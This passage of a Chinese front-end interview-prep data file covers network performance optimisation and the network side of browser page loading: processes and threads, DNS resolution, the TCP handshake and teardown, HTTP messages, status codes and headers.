    "testPoint": "前端“网络层面的性能优化”是高频面试考点，涵盖了从资源加载、缓存、连接管理，到协议选择等多个方向。面试时往往从“用户输入 URL 到页面加载”这条链路入手，考查在网络传输环节提升页面性能的能力。\n\n### 1. **DNS 优化**\n\n* 使用 DNS 预解析（`<link rel=\"dns-prefetch\">`）\n* 减少跨域请求\n* 使用 CDN 降低解析延迟\n* 减少 DNS 查询频次（共享域名）\n\n### 2. **TCP/TLS 连接优化**\n\n* **连接复用**（Keep-Alive、HTTP/2 多路复用）\n* 减少重定向次数\n* 减少第三方域名连接数（避免多次三次握手）\n* TLS1.3 优化握手过程\n\n### 3. **HTTP 协议优化**\n\n* 使用 HTTP/2：\n\n  * 多路复用（消除队头阻塞）\n  * 头部压缩\n  * Server Push（预加载资源）\n\n* 使用 HTTP/3：\n\n  * 基于 QUIC，减少握手延迟\n\n\n### 4. **缓存策略优化**\n\n* 强缓存：`Cache-Control: max-age`、`Expires`\n* 协商缓存：`ETag` / `Last-Modified`\n* CDN 缓存策略\n* 静态资源使用 hash 文件名（内容变动才刷新）\n\n\n### 5. **资源加载优化**\n\n* 懒加载：图片、视频等资源按需加载（`loading=\"lazy\"`）\n* 预加载 & 预请求：\n\n  * `<link rel=\"preload\">`\n  * `<link rel=\"prefetch\">`\n* 按需加载模块（JS/CSS）\n\n\n### 6. **压缩与传输优化**\n\n* 启用 Gzip 或 Brotli 压缩文本资源\n* 图片压缩优化（WebP、AVIF）\n* 雪碧图、SVG 精简、字体子集\n* 减少重复包体（第三方库抽离 CDN）\n\n\n### 7. **请求合并与去重**\n\n* 合并资源：CSS、JS 打包合并（仅适用于 HTTP/1.1）\n* 使用图标字体 / 雪碧图减少请求\n* GraphQL 替代多个 REST 请求\n\n### 8. **首屏优化**\n\n* 关键资源优先加载（CSS、字体、JS）\n* SSR + Hydration 提高 TTFB\n* Skeleton + Lazy Render 提高首屏体验\n* Critical CSS 提前内联\n\n### 9. **使用 CDN 加速**\n\n* 静态资源分发到最近节点\n* 减少回源次数、提高命中率\n* 自定义缓存配置策略\n\n### 10. **Service Worker 与离线缓存**\n\n* 用于缓存页面资源与接口数据\n* 提高重复访问性能\n* 提供离线能力（PWA）\n\n### 11. **性能指标与监控**\n\n* TTFB（首字节时间）\n* FCP、LCP、FID（核心 Web Vitals）\n* Resource Timing API、Navigation Timing API\n* 使用 Lighthouse、WebPageTest、Chrome DevTools 分析\n\n\n## 面试常见问题示例\n\n| 面试题方向  | 具体示例问题                |\n| ------ | --------------------- |\n| 网络优化策略 | 页面加载慢，网络层如何优化？        |\n| 协议选择   | HTTP/2 带来哪些性能提升？      |\n| 缓存优化   | 强缓存和协商缓存的优先级？         |\n| 压缩优化   | Brotli 与 Gzip 有哪些不同？  |\n| 请求优化   | 怎么减少第三方资源带来的性能影响？     |\n| 首屏优化   | 如何优化首屏加载时间？SSR 有哪些作用？ |\n",
    "exerciseKeyList": "[\"0b161fbb-0fe4-4fc2-a028-e432769c458f\",\"26e22fa9-becc-4552-b79a-da2f67451455\",\"549f8d07-a907-4c86-93c1-d3e8fef30613\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-07-28T07:28:31.000Z",
    "updateAt": "2025-08-06T02:12:55.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "0b161fbb-0fe4-4fc2-a028-e432769c458f",
        "title": "想要实现页面加载速度提升（性能优化），可以从哪些方向来尝试？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:14.000Z",
        "updateAt": "2024-10-18T01:36:35.000Z"
      },
      {
        "exerciseKey": "26e22fa9-becc-4552-b79a-da2f67451455",
        "title": "前端性能优化指标有哪些？怎么进行性能检测？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-05T10:40:13.000Z",
        "updateAt": "2024-08-10T17:06:27.000Z"
      },
      {
        "exerciseKey": "549f8d07-a907-4c86-93c1-d3e8fef30613",
        "title": "说说常规的前端性能优化手段",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T15:37:40.000Z",
        "updateAt": "2024-07-18T18:24:32.000Z"
      }
    ]
  },
  "250": {
    "id": 250,
    "tagId": 16,
    "title": "浏览器渲染过程中的网络层面",
    "explanation": "## 一、梳理主干流程\n\n知识体系中，最重要的是骨架，脉络。有了骨架后，才方便填充细节。所以，先梳理下主干流程：\n\n> 1.  浏览器接收url并开启一个新进程（这一部分可以展开浏览器的进程与线程的关系）\n> 2.  浏览器解析输入的 URL，提取出其中的协议、域名和路径等信息。（这部分涉及URL组成部分）\n> 3.  浏览器向 DNS 服务器发送请求，DNS服务器通过 多层查询 将该 域名 解析为对应的 IP地址 ，然后将请求发送到该IP地址上，与 服务器 建立连接和交换数据。（这部分涉及DNS查询）\n> 4.  浏览器与服务器建立 TCP 连接。（这部分涉及TCP三次握手/四次挥手/5层网络协议）\n> 5.  浏览器向服务器发送 HTTP 请求，包含请求头和请求体。（4,5,6,7包含http头部、响应码、报文结构、cookie等知识）\n> 6.  服务器接收并处理请求，并返回响应数据，包含状态码、响应头和响应体。\n> 7.  浏览器接收到响应数据，解析响应头和响应体，并根据状态码判断是否成功。\n> 8.  如果响应成功，浏览器接收到http数据包后的解析流程（这部分涉及到html - 词法分析，解析成DOM树，解析CSS生成CSSOM树（样式树），合并生成render渲染树（样式计算）。然后layout布局，分层，调用GPU绘制等，最后将绘制的结果合成最终的页面图像，显示在屏幕上。这个过程会发生回流和重绘）。\n> 9.  连接结束 -> 断开TCP连接 四次挥手\n\n梳理出主干骨架，然后就需要往骨架上填充细节内容。\n\n接下来重点介绍“浏览器渲染过程中的网络层面”。\n\n* * *\n\n## 二、浏览器接收url并开启一个新进程\n\n这部分内容开始之前我们需要先通过一张图对 进程 和 线程 的关系有一个初步的了解。\n\n![在这里插入图片描述](https://static.ecool.fun//article/464e9fa6-777c-4bba-9e0a-928f4d8f9478.)\n\n### 1\\. 浏览器是多进程的\n\n浏览器是多进程的，有一个主进程，每打开一个tab页面都会新开一个**进程**（某些情况下多个tab会合并进程）。\n\n> **注意**：在这里浏览器应该也有自己的优化机制，有时候打开多个tab页后，比如打开多个空白标签页。可以在Chrome任务管理器中看到，进程被合并了。\n\n进程可能包括主进程，插件进程，GPU，tab页（浏览器内核）等等。\n\n-   **Browser进程**：浏览器的主进程（负责协调、主控），只有一个。\n-   **第三方插件进程**：每种类型的插件对应一个进程，仅当使用该插件时才创建。\n-   **GPU进程**：最多一个，用于3D绘制等。\n-   **浏览器渲染进程**（浏览器内核）（内部是多线程的）：默认每个Tab页面一个进程，互不影响。作用是页面渲染，脚本执行，事件处理等。（浏览器有时候会优化，如多个空白页合并成一个进程）\n\n强化记忆：**`在浏览器中打开一个网页相当于新起了一个进程（进程内有自己的多线程）`**\n\n下图以 chrome浏览器 为例。我们可以自己通过Chrome的更多工具 =》 任务管理器 自行验证查看，可以看到chrome的任务管理器中有多个进程（分别是每一个Tab页面有一个独立的进程，以及一个主进程）  \n然后能看到每个进程的内存资源信息以及cpu占有率。\n\n![浏览器多进程图示：](https://static.ecool.fun//article/4f7c6307-2358-4046-9bf4-b29784b4819f.)\n\n### 2\\. 浏览器内核是多线程的\n\n每一个tab页面可以看作是浏览器内核的一个进程，然后这个进程是多线程的，它有几大类子线程\n\n-   **GUI渲染线程**：负责渲染浏览器界面，解析HTML，CSS，构建DOM树和RenderObject树，布局和绘制等。`GUI渲染线程与JS引擎线程是互斥的`。\n-   **JS引擎线程**：也叫 JS 内核，负责解析执行 JS 脚本程序的主线程，例如 V8 引擎。JS引擎一直等待着任务队列中任务的到来，然后加以处理，一个Tab页（renderer进程）中无论什么时候都只有一个JS线程在运行JS程序。\n-   **事件触发线程**：属于浏览器内核线程，主要用于控制事件，例如鼠标、键盘等，当事件被触发时，就会把事件的处理函数推进事件队列，等待 JS 引擎线程执行。\n-   **定时器触发线程**：主要控制 setInterval和 setTimeout，用来计时，计时完毕后，则把定时器的处理函数推进事件队列中，等待 JS 引擎线程。\n-   **异步http请求线程**：通过XMLHttpRequest连接后，通过浏览器新开的一个线程，监控readyState状态变更时，如果设置了该状态的回调函数，则将该状态的处理函数推进事件队列中，等待JS引擎线程执行。\n\n![在这里插入图片描述](https://static.ecool.fun//article/9570b8dd-35da-4014-ab6e-b9fbdf8e03fc.)\n\n可以看到，里面的JS引擎是内核进程中的一个线程，这也是为什么常说JS引擎是单线程的。\n\n虽然 JS 是单线程的，但实际上参与工作的线程一共有四个：  \n![在这里插入图片描述](https://static.ecool.fun//article/68371517-5a21-428d-8058-86f9bfc5d59c.)\n\n后面三个只是协助，只有 JS 引擎线程是真正执行的。\n\n### 3\\. JS引擎单线程的原因\n\nJS引擎之所以是单线程，是由于JavaScript最初是作为浏览器脚本语言开发的，并且JavaScript需要操作DOM等浏览器的API，如果多个线程同时进行DOM更新等操作则可能会出现各种问题（如竞态条件、数据难以同步、复杂的锁逻辑等），因此将JS引擎设计成单线程的形式就可以避免这些问题。  \n虽然JS引擎是单线程的，但是通过使用 **异步编程模型** 和 **事件循环机制**，JS仍然可以实现高并发处理。\n\n> **如果JS是多线程的场景描述:**  \n> 那么现在有2个线程，process1 process2，由于是多线程的JS，所以他们对同一个dom，同时进行操作  \n> process1 删除了该dom，而process2 编辑了该dom，同时下达2个矛盾的命令，浏览器究竟该如何执行呢？这时可能就会出现问题了。\n\n### 4\\. GUI渲染线程与JS引擎线程互斥\n\n由于JavaScript是可操纵DOM的，如果在修改这些元素属性同时渲染界面（即JS线程和UI线程同时运行），那么渲染线程前后获得的元素数据就可能不一致了。\n\n因此为了防止渲染出现不可预期的结果，浏览器设置GUI渲染线程与JS引擎为互斥的关系，当JS引擎执行时GUI线程会被挂起，  \nGUI更新则会被保存在一个队列中等到JS引擎线程空闲时立即被执行。\n\n因为本文主要讲输入URL后页面的渲染过程，所以关于浏览器开启网络请求线程这部分详细内容大家可以移步查看，里面包括JS运行机制，进程线程的详解：  \n[从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理](https://segmentfault.com/a/1190000012925872 \"https://segmentfault.com/a/1190000012925872\")\n\n### 5\\. 渲染过程中遇到 JS 文件如何处理？\n\nJS的加载、解析与执行会阻塞文档的解析，也就是说，在构建 DOM 时，HTML 解析器若遇到了 JavaScript，那么它会暂停文档的解析，将控制权移交给 JS 引擎，等 JS 引擎运行完毕，浏览器再从中断的地方恢复继续解析文档。  \n也就是说，如果想要首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是建议将 script 标签放在 body 标签底部的原因。当然在当下，并不是说 script 标签必须放在底部，因为你可以给 `script` 标签添加 `defer` 或者 `async` 属性。\n\n**defer与async的区别**\n\n-   defer要等到整个页面在内存中正常渲染结束（DOM 结构完全生成，以及其他脚本执行完成），才会执行。\n-   async一旦下载完，渲染引擎就会中断渲染，执行这个脚本以后，再继续渲染。\n-   一句话，`defer`是“`渲染完再执行`”，`async`是“`下载完就执行`”。\n-   另外，如果有多个defer脚本，会按照它们在页面出现的顺序加载，而多个async脚本是不能保证加载顺序的。（因为只要该模块加载完成，就执行该模块，不确定模块什么时候能加载完）\n\n[关于defer/async用法解释](https://www.kancloud.cn/cyyspring/more/2401820 \"https://www.kancloud.cn/cyyspring/more/2401820\")\n\n* * *\n\n## 二、解析URL\n\n输入URL后，会进行解析（URL的本质就是统一资源定位符）\n\nURL一般包括几大部分：\n\n1.  **协议**（Protocol）：指访问资源时使用的协议，常见的协议有 HTTP、HTTPS、FTP 等。\n2.  **主机名**（Host）：指服务器的域名或 IP 地址，用于唯一标识一个服务器。\n3.  **端口号**（Port）：指服务器上提供服务的端口号，可以省略。例如，默认的 HTTP 端口为 80，HTTPS 端口为 443。\n4.  **路径**（Path）：指服务器上资源的路径，表示访问资源时需要进入的目录层级以及资源的名称。\n5.  **查询参数**（Query）：指对资源请求的参数，格式为 key=value，多个参数间使用 `&` 连接。\n6.  **锚点**（Fragment）：指 `#` 后的hash值，一般用来定位到某个位置。\n\n> 举个例子，[www.example.com/index.html?…](http://www.example.com/index.html?key1=value1&key2=value2#section \"http://www.example.com/index.html?key1=value1&key2=value2#section\") 表示了一个 URL，  \n> 其中协议为 HTTP，主机名为 [www.example.com，路径为](http://www.example.com%EF%BC%8C%E8%B7%AF%E5%BE%84%E4%B8%BA \"http://www.example.com%EF%BC%8C%E8%B7%AF%E5%BE%84%E4%B8%BA\") /index.html，查询参数为 key1=value1 和 key2=value2，锚点为 section。\n\n* * *\n\n## 三、DNS域名解析\n\n在解析过程之前我们先理解几个概念。\n\n### 1\\. DNS是什么？\n\nDNS（Domain Name System）是一种用于将`域名`解析为`IP地址`的系统。（把我们的域名映射为IP地址，这就是DNS的作用）  \n**它可以将人们易于记忆的域名转换为服务器可识别的IP地址，这样用户就可以使用域名访问网站，而不必直接输入数字格式的IP地址。**\n\n在浏览器中输入网址时，电脑会先向`DNS服务器`发送请求，获取该网址对应的`IP地址`，**并在成功获取后直接连接该IP地址对应的服务器**，在**服务器**端获取网页内容并显示出来，完成整个访问过程。因此，DNS在互联网中起着至关重要的作用。\n\n### 2\\. IP和域名的关系\n\nIP（Internet Protocol）地址是一个数字标识，用于唯一识别连接到互联网上的每个计算机、服务器和其他设备。域名则是网站的人类可读的名称。域名系统（DNS服务器）可以将域名转换为与之关联的IP地址。  \n简单来说，**IP地址是网络设备的标识符，而域名则是方便人们记忆和使用的网络地址别名。**  \n域名系统通过将 `域名` 映射到 `IP地址`，使互联网上的用户能够以易记的方式访问特定的网站或服务器。\n\n### 3\\. 域名服务器概念图\n\n![在这里插入图片描述](https://static.ecool.fun//article/245b611a-0ad7-4c39-8b8e-5aa2458ea3ce.)\n\n从上面这张图可以看到，域名的管理是分层次的。最高级是根，也叫做`根服务器`。从上往下功能逐渐细化。DNS就是和这些服务器进行打交道。  \n有了上面的这些概念，现在我们再来认识一下DNS域名解析过程就容易多了。\n\n### 4\\. DNS域名解析过程\n\n> 1.  **首先会在浏览器缓存中查询是否有该域名对应的IP地址，若有则直接返回，解析过程结束。**\n> 2.  **如果浏览器缓存中没有该域名对应的IP地址，则向本地DNS服务器发送查询请求。**\n> 3.  **如果本地DNS服务器缓存中有该域名对应的IP地址，则直接返回，解析过程结束。**\n> 4.  **如果本地DNS服务器缓存中没有该域名对应的IP地址，则向根域名服务器发送查询请求。**\n> 5.  **根域名服务器返回一个所查询域的顶级域名服务器地址。**\n> 6.  **本地DNS服务器向 顶级域名服务器 发送查询请求。**\n> 7.  **顶级域名服务器返回下一级DNS服务器的地址（权威DNS服务器）。**\n> 8.  **本地DNS服务器向权威DNS服务器发送查询请求。**\n> 9.  **权威DNS服务器返回该域名对应的IP地址，并将结果返回给本地DNS服务器。**\n> 10.  **本地DNS服务器将结果保存在缓存中，便于下次使用。并将结果返回给浏览器。**\n> 11.  **浏览器将结果保存在缓存中，并使用该IP地址访问对应的网站。**\n\n这个过程大体大体由一张图可以表示：从网上找的图片方便理解。  \n而且，需要知道dns解析是很耗时的，因此如果解析域名过多，会让首屏加载变得过慢，可以考虑`dns-prefetch`优化\n\n![在这里插入图片描述](https://static.ecool.fun//article/4eafba49-e826-4244-8ef0-a56cdc1fb1f1.)  \n![在这里插入图片描述](https://static.ecool.fun//article/58ac7c88-efb5-4bb4-b590-c20bdb6ddbfb.)\n\n关于 本地DNS服务器 这里单独讲解下：\n\n> 如果之前的过程无法解析时，**操作系统**会把这个域名发送给这个本地DNS服务器。每个完整的内网通常都会配置本地DNS服务器，例如用户是在学校或工作单位接入互联网，那么用户的本地DNS服务器肯定在学校或工作单位里面。它们一般都会缓存域名解析结果，当然缓存时间是受到域名的失效时间控制的。大约80%的域名解析到这里就结束了，后续的DNS迭代和递归也是由本地DNS服务器负责。\n\n### 5\\. DNS解析时发现域名和IP不一致，访问了该域名会如何？\n\n-   域名和IP不一致，域名解析成了其他的的IP地址，但是这个IP地址正确。访问该域名就会访问其他的网站。\n\n> 知乎上有一个阿里巴巴的回答：  \n> 从技术上来讲是可以解析到任意IP地址的，这时候针对这个地址发起HTTP访问，HTTP头中的host字段会是你的域名（而非该IP对应站点的域名），**如果对方的网站HTTP服务器没有做对应的防护就可以访问，如果对方的网站HTTP服务器有防护则无法访问**。\n\n-   域名和IP不一致，域名解析成了其他的的IP地址，但是这个IP地址错误，访问该域名就会失败。\n\n可参考：[DNS解析时发现域名和IP不一致，访问了该域名会如何（大厂真题）](https://blog.csdn.net/java_xiaoo/article/details/108719646 \"https://blog.csdn.net/java_xiaoo/article/details/108719646\")\n\n* * *\n\n## 四、建立 TCP 连接\n\n需要了解3次握手规则建立连接以及断开连接时的四次挥手。\n\n拿到了IP地址后，就可以发起HTTP请求了。HTTP请求的本质就是TCP/IP的请求构建。建立连接时需要 3次握手 进行验证，断开链接也同样需要 4次挥手 进行验证，保证传输的可靠性。\n\n### 1\\. 三次握手\n\n模拟三次握手（场景对话版）：\n\n> 客户端：hello，你是server么？  \n> 服务端：hello，我是server，你是client么  \n> 客户端：yes，我是client\n\n可通过下方图文结合方式字理解三次握手：  \n![在这里插入图片描述](https://static.ecool.fun//article/d5e27842-6508-41c1-899b-979aa7f15d0e.)  \n**三次握手​​​​​​​原理：**\n\n**第一次握手**：客户端发送一个带有 **`SYN`**（synchronize同步）标志的数据包给服务端。  \n**第二次握手**：服务端接收成功后，回传一个带有 **`SYN/ACK`** 标志的数据包传递确认信息，表示我收到了。  \n**第三次握手**：客户端再回传一个带有 **`ACK`** 标志的数据包，表示我知道了，握手结束。\n\n其中：SYN标志位数置1，表示建立TCP连接；ACK表示响应，置1时表示响应确认。\n\n**三次握手过程详细说明：**  \n刚开始客户端处于 `Closed` 的状态，服务端处于 `Listen` 状态。\n\n> 1.  第一次握手: 客户端发送标识位SYN = 1，随机产生序列号seq = x的数据包到服务端，服务端由SYN = 1知道客户端要建立连接，并进入`SYN_SENT`状态，等待服务器确认；`（SYN=1，seq=x，x为随机生成的数值）`\n> 2.  第二次握手: 服务器收到请求并确认联机信息后，向客户端发送标识位SYN = 1，ACK = 1和随机产生的序列号seq = y, 确认码ack number = x+1（客户端发送的seq+1）的数据包，此时服务器进入`SYN_RCVD`状态；`（SYN=1，ACK=1，seq=y，y为随机生成的数值，确认号 ack=x+1）`这里ack加1可以理解为时确认和谁建立连接。\n> 3.  第三次握手：客户端收到后检查确认码ack number是否正确，即和第一次握手发送的序列号加1结果是否相等，以及ACK标识位是否为1；若正确，客户端发送标识位ACK = 1、seq = x + 1和确认码ack = y + 1（服务器发送的seq+1）到服务器，服务器收到后确认ACK=1和seq是否正确，若正确则完成建立连接，此包发送完毕，客户端和服务器进入`ESTAB_LISHED`状态。完成三次握手，客户端与服务器开始传送数据.。`（ACK=1，seq=x+1，ack=y+1）`\n\n**TCP 三次握手的建立连接的过程就是相互确认初始序号的过程**。告诉对方，什么样序号的报文段能够被正确接收。  \n**第三次握手的作用是：** `客户端对服务器端的初始序列号的确认，如果只使用两次握手，那么服务器就没有办法知道自己的序号是否已被确认。同时这样也是为了防止失效的请求报文被服务器接收，而出现错误的情况。`\n\n### 2\\. 四次挥手\n\n模拟四次挥手（场景对话版）：\n\n> 主动方：我已经关闭了向你那边的主动通道了，只能被动接收了  \n> 被动方：收到通道关闭的信息，我这还有数据没有发送完成，你等下  \n> 被动方：那我也告诉你，我这边向你的主动通道也关闭了  \n> 主动方：最后收到数据，之后双方无法通信\n\n可通过下方图文结合方式理解四次挥手​​​​​​​：  \n![在这里插入图片描述](https://static.ecool.fun//article/26e6d3ae-7636-4d1a-bfa5-ee19f272ea59.)\n\n**四次挥手​​​​​​​原理：**\n\n**第一次挥手**：客户端发送一个FIN，用来关闭客户端到服务器的数据传送，并且指定一个序列号。客户端进入`FIN_WAIT_1`状态。  \n**第二次挥手**：服务器收到FIN后，发送一个ACK给客户端，确认序号为客户端的序列号值 +1 ，表明已经收到客户端的报文了，此时服务器处于 `CLOSE_WAIT` 状态。  \n**第三次挥手**：服务器发送一个FIN，用来关闭服务器到客户端的数据传送，服务器进入`LAST_ACK`状态。  \n**第四次挥手**：客户端收到FIN后，客户端进入`TIME_WAIT`状态，接着发送一个ACK给服务器，确认序号为收到序号+1 ，服务器收到确认后进入`CLOSED`状态，完成四次挥手。\n\n其中：FIN标志位数置1，表示断开TCP连接。\n\n**四次挥手过程详细说明：**\n\n刚开始双方都处于 `ESTABLISHED` 状态，假如是客户端先发起关闭请求。\n\n> 1.  第一次挥手：客户端发送一个FIN = 1、初始化序列号seq = u，到服务器，表示需要断开TCP连接，客户端进入`FIN_WAIT_1`状态，等待服务器的确认。`（FIN = 1，seq = u，u由客户端随机生成）`\n> 2.  第二次挥手：服务器收到这个FIN，它发回ACK = 1、seq序列号（由回复端随机生成）、确认序号ack为收到的序号加1（ack = u+1）；以便客户端收到信息时，知晓自己的TCP断开请求已经得到验证。服务器进入`CLOSE_WAIT`，等待关闭连接；客户端进入`FIN_WAIT_2`，稍后关闭连接。`（ACK = 1，seq = v，ack = u+1）`\n> 3.  第三次挥手：服务器在回复完客户端的TCP断开请求后，不会马上进行TCP连接的断开。服务器会先确保断开前，所有传输到客户端的数据是否已经传输完毕，一旦确认传输完毕，就会发回FIN = 1，ACK = 1,seq = w和确认码ack = u+1给客户端，服务器进入`LAST_ACK` 状态，等待最后一次ACK确认;`（FIN = 1，ACK = 1,seq = w，ack = u+1 ，w由服务器端随机生成）`\n> 4.  第四次挥手：客户端收到服务器的TCP断开请求后，会回复服务器的断开请求。包含ACK = 1、随机生成的seq = u+1，并将确认序号设置为收到序号加1（ack = w+1）到服务器，从而完成服务器请求的验证回复。客户端进入`TIME-WAIT` 状态，此时 TCP 未释放掉，需要等待 `2MSL` 以确保服务器收到自己的 ACK 报文后进入`CLOSE`状态，服务端进入`CLOSE`状态。`（ACK = 1，seq = u+1，ack = w+1）`\n> \n> **注意：为什么 TIME\\_WAIT 等待的时间是 2MSL？**  \n> 1）MSL 是 报文最大生存时间，一来一回需要等待 2 倍的时间。  \n> 2）最后一次挥手中，客户端会等待一段时间再关闭的原因，是为了防止发送给服务器的确认报文段丢失或者出错，从而导致服务器 端不能正常关闭。\n\n**常用关键词总结：**\n\n-   SYN标志位用来建立TCP连接。如果SYN=1而ACK=0，表明它是一个连接请求；如果SYN=1且ACK=1，则表示同意建立一个连接。\n-   ACK表示响应，置1时表示确认号（为合法，为0的时候表示数据段不包含确认信息，确认号被忽略。)\n-   FIN表示关闭连接，置1时表示发端完成发送任务。用来释放连接，表明发送方已经没有数据发送了。\n\n**为什么需要四次挥手呢？**\n\n> 1.  TCP协议 的连接是`全双工`的，即数据传输可以同时在两个方向上进行。所以终止连接时，需要每个方向都单独关闭。（单独一方的连接关闭，只代表不能再向对方发送数据，连接处于的是半关闭状态）\n> 2.  客户端发送FIN报文终止连接后，`服务器可能还有数据需要发送`（比如上一次的响应），所以服务器会先发送ACK报文确认收到FIN报文，并将未发送的数据发送出去，然后再发送自己的FIN报文终止连接。\n> 3.  客户端接收到服务器的FIN报文后也需要发送ACK报文确认收到，才能正式关闭连接。\n\n### 3\\. 为什么是三次握手？不是两次、四次？\n\n为了确认双方的 **接收能力** 和 **发送能力** 都正常。\n\n如果是用两次握手，则会出现下面这种情况：  \n如客户端发出连接请求，但因连接请求报文丢失而未收到确认，于是客户端再重传一次连接请求。后来收到了确认，建立了连接。数据传输完毕后，就释放了连接，此时客户端共发出了两个连接请求报文段。  \n其中第一个丢失，第二个到达了服务端，但是第一个丢失的报文段只是在某些网络节点长时间滞留了，延误到连接释放以后的某个时间才到达服务端，此时服务端误以为客户端又发出一次新的连接请求，于是就向客户端发出确认报文段，同意建立连接，不采用三次握手；只要服务端发出确认，就建立新的连接了。此时客户端忽略服务端发来的确认，也不发送数据，则服务端一直等待客户端发送数据，浪费了资源。\n\n### 4\\. TCP/IP的分层管理\n\n按层次分为以下四层：`应用层`、`传输层`、`网络层`和`数据链路层`。\n\n**为什么要分层呢？**\n\n> 分层是有一定好处的。比如，如果互联网是由一个协议统筹，某个地方需要改变设计时，就必须把所有部分整体替换掉。而分层之后只需把变动的层替换掉即可。把各层之间的接口部分规划好之后，每个层次内部的设计就能够自由改动了。\n\n**各层的作用**：\n\n> 1.  应用层（DNS，HTTP协议）DNS将域名解析成IP地址并发送HTTP请求，OSI 参考模型中最靠近用户的一层。\n> 2.  传输层（TCP，UDP） 建立TCP连接（三次握手），客户端和服务端数据传输就是在这层进行的。\n> 3.  网络层（IP，ARP地址解析协议）IP寻址及路由选择；所起的作用就是在众多的选项内选择一条传输线路。\n> 4.  数据链路层：用来处理连接网络的硬件部分，硬件上的范畴均在链路层的作用范围之内。\n\n其实就是一个概念：**从客户端发出HTTP请求到服务器接收，中间会经过一系列的流程。**\n\n简括就是：\n\n> **从应用层 DNS 将域名解析成 IP 地址，并发送 HTTP 请求，到传输层通过三次握手建立tcp/ip连接，再到网络层的ip寻址，再到数据链路层的封装成帧，利用物理介质传输。**\n\n当然，服务端的接收就是反过来的步骤。**发送端从应用层往下走，接收端则从链路层往上走**。  \n![在这里插入图片描述](https://static.ecool.fun//article/f04d7b38-8bd0-4fc8-92df-1db3b5a421a2.)\n\n举例，其实分层这部分大致了解下，知道怎么回事就可以啦。\n\n> 我们用HTTP举例来说明，首先作为发送端的客户端在应用层（HTTP协议）发出某个想看Web页面的HTTP请求。  \n> 接着，为了传输方便，在传输层（TCP协议）把应用层处收到的数据（HTTP请求报文）进行分割，并在各个报文上打上标记序号及端口号转发给网络层。  \n> 在网络层（IP协议），增加作为通信目的地的MAC地址后转发给链路层。这样一来，发往网络的通信请求就准备齐全了。  \n> 接收端的服务器在链路层接收到数据，瞬狙往上层发送，一直到应用层。当传输到应用层，才算真正接收到由客户端发送过来的HTTP请求。\n\n* * *\n\n## 五、浏览器向服务器发送 HTTP 请求\n\n### 1\\. HTTP请求报文都有什么组成？\n\nHTTP请求报文主要由三个部分组成：`请求行`、`请求头`和`请求体`。具体如下：\n\n**请求行**：包含`请求方法`、`URI（请求的资源路径）`和`HTTP协议版本`。例如：GET /index.html HTTP/1.1。  \n**请求头（Header**）: 包含了客户端向服务器发送的附加信息，例如浏览器类型、字符编码、认证信息等。请求头以`键值对`的形式存在，多个键值对之间以换行符分隔。例如：Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7。  \n**请求体（Body）** : 存放`请求参数`，即浏览器向服务器传输数据的实体部分。常用于POST方法提交请求时，发送表单数据、JSON数据等类型的数据。\n\n**需要注意的是，并不是所有的HTTP请求都必须带有请求体，像`GET请求`通常不需要发送请求体。**\n\n![在这里插入图片描述](https://static.ecool.fun//article/7f8245f1-fed6-455b-a1ed-9c7345c504e8.)\n\n> **为什么 HTTP 报文中要存在 “空行”?**  \n> 因为 HTTP 协议并没有规定报头部分的键值对有多少个。空行就相当于是 “报头的结束标记”, 或者是 “报头和正文之间的分隔符”。  \n> HTTP 在传输层依赖 TCP 协议, TCP 是面向字节流的. 如果没有这个空行, 就会出现 “粘包问题”\n\n### 2\\. 常见状态码含义\n\n**区分状态码**  \n1××开头 - 信息性状态码，表示HTTP请求已被接收，需要进一步处理。  \n2××开头 - 成功状态码，表示请求已成功处理完成。  \n3××开头 - 重定向状态码，表示请求需要进一步的操作以完成。  \n4××开头 - 客户端错误状态码，表示请求包含错误或无法完成。  \n5××开头 - 服务器错误状态码，表示服务器无法完成有效的请求。\n\n**常见状态码**  \n200 - 请求成功，从客户端发送给服务器的请求被正常处理并返回\n\n301 - 表示被请求的资源已经被永久移动到新的URI（永久重定向）  \n302 - 表示被请求的资源已经被临时移动到新的URI（临时重定向）  \n304 - 表示服务器资源未被修改；通常是在客户端发出了一个条件请求，服务器通过比较资源的修改时间来确定资源是否已被修改\n\n400 - 服务器不理解请求，请求报文中存在语法错误  \n401 - 请求需要身份验证  \n403 - 服务器拒绝请求（访问权限出现问题）  \n404 - 被请求的资源不存在  \n405 - 不允许的HTTP请求方法，意味着正在使用的HTTP请求方法不被服务器允许\n\n500 - 服务器内部错误，无法完成请求  \n503 - 服务器当前无法处理请求，一般是因为过载或维护\n\n### 3\\. 请求/响应头部\n\n请求和响应头部也是分析时常用到的。\n\n常用的请求头部（部分）：\n\n> **Accept**: 接收类型，表示浏览器支持的MIME类型  \n> （对标服务端返回的`Content-Type`）  \n> **Accept-Encoding**：浏览器支持的压缩类型,如`gzip`等,超出类型不能接收  \n> **Content-Type**：客户端发送出去实体内容的类型  \n> **Cache-Control**: 指定请求和响应遵循的缓存机制，如`no-cache`  \n> **If-Modified-Since**：对应服务端的`Last-Modified`，用来匹配看文件是否变动，只能精确到1s之内，`http1.0`中  \n> **Expires**：缓存控制，在这个时间内不会请求，直接使用缓存，http1.0，而且是服务端时间  \n> **Max-age**：代表资源在本地缓存多少秒，有效时间内不会请求，而是使用缓存，http1.1中  \n> **If-None-Match**：对应服务端的`ETag`，用来匹配文件内容是否改变（非常精确），http1.1中  \n> **Cookie**: 有`cookie`并且同域访问时会自动带上  \n> **Connection**: 当浏览器与服务器通信时对于长连接如何进行处理,如`keep-alive`  \n> **Host**：请求的服务器`URL`  \n> **Origin**：最初的请求是从哪里发起的（只会精确到端口）,`Origin`比`Referer`更尊重隐私  \n> **Referer**：该页面的来源`URL`(适用于所有类型的请求，会精确到详细页面地址，`csrf`拦截常用到这个字段)  \n> **User-Agent**：用户客户端的一些必要信息，如UA头部等\n\n常用的响应头部（部分）：\n\n> **Access-Control-Allow-Headers**: 服务器端允许的请求`Headers`  \n> **Access-Control-Allow-Methods**: 服务器端允许的请求方法  \n> **Access-Control-Allow-Origin**: 服务器端允许的请求`Origin`头部（譬如为\\*）  \n> **Content-Type**：服务端返回的实体内容的类型  \n> **Date**：数据从服务器发送的时间  \n> 